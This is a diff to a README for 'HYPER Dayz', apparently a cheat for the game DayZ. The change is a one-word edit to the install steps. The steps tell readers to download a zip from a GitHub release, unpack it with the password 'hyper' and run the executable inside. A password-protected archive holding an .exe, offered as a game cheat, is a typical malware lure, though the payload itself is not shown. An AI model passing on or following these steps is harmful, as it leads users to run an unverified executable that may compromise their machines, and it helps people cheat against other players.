@@ -1,7 +1,7 @@
 # HYPER Dayz
 ![3s](https://github.com/user-attachments/assets/aa366b7c-7ee5-4fe7-952e-0c8033d94e39)
 ## How to use
-1. **Download the ZIP archive with the latest version https://github.com/kerkimdark2/DayZ_HYPER_Cheat/releases/download/latest/hyper_latest.zip**.
+1. **Download the archive with the latest version https://github.com/kerkimdark2/DayZ_HYPER_Cheat/releases/download/latest/hyper_latest.zip**.
 2. **Unpack it** *(pas: **hyper**)*.
 3. **Run the '.exe` file**.
 
